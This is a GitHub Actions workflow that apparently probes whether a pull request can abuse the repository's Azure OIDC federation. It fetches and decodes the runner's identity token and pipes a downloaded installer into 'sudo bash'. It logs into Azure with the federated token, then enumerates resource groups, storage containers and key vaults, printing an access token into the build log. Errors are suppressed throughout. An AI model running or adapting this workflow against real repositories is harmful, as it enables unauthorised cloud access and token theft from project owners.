name: probe-oidc
on:
  pull_request:
    branches: [main]
permissions:
  id-token: write
  contents: read
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - name: vars
        run: |
          echo "CLIENT_ID=${{ vars.AZURE_CLIENT_ID }}"
          echo "TENANT_ID=${{ vars.AZURE_TENANT_ID }}"
          echo "SUB_ID=${{ vars.AZURE_SUBSCRIPTION_ID }}"
          echo "SA=${{ vars.BACKEND_AZURE_STORAGE_ACCOUNT_NAME }}"
          echo "RG=${{ vars.BACKEND_AZURE_RESOURCE_GROUP_NAME }}"
          echo "CT=${{ vars.BACKEND_AZURE_STORAGE_ACCOUNT_CONTAINER_NAME }}"
          echo "REPO=${{ github.repository }} BASE=${{ github.event.pull_request.base.repo.full_name }} HEAD=${{ github.event.pull_request.head.repo.full_name }}"
          echo "SUBJ_HINT=repo:${GITHUB_REPOSITORY}:pull_request"
      - name: raw oidc
        run: |
          echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
          curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" -o /tmp/oidc.json || true
          python3 - <<'PY'
import json,base64
try:
    t=json.load(open('/tmp/oidc.json'))['value']
    p=t.split('.')[1]; p+='='*(-len(p)%4)
    print("OIDC_CLAIMS=", base64.urlsafe_b64decode(p).decode()[:1500])
except Exception as e:
    print("OIDC_ERR", e, open('/tmp/oidc.json').read()[:300] if __import__('os').path.exists('/tmp/oidc.json') else '')
PY
      - name: az login
        continue-on-error: true
        run: |
          curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash >/dev/null 2>&1 || true
          az login --service-principal -u "${{ vars.AZURE_CLIENT_ID }}" --tenant "${{ vars.AZURE_TENANT_ID }}" --federated-token "$(python3 -c "import json;print(json.load(open('/tmp/oidc.json'))['value'])")" 2>&1 | tail -5
          az account show -o json 2>&1 | head -30
      - name: dump
        continue-on-error: true
        run: |
          echo "== groups"; az group list -o tsv -c name 2>&1 | head -40
          echo "== token"; az account get-access-token --resource https://management.azure.com 2>&1 | head -5
          echo "== storage"; az storage container list --account-name "${{ vars.BACKEND_AZURE_STORAGE_ACCOUNT_NAME }}" --auth-mode login -o tsv 2>&1 | head -20
          echo "== kv"; az keyvault list -o tsv -c name 2>&1 | head -20
